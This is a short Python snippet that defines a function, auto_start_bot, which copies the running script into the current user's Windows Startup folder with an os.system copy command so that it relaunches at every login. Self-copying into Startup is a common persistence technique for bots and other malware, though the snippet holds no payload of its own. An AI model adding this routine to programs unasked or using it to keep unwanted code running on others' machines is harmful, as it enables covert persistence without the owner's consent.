import os
import sys


def auto_start_bot():
    Thisfile = sys.argv[0]
    Thisfile_name = os.path.basename(Thisfile)
    user_path = os.path.expanduser('~')

    if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(
            f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
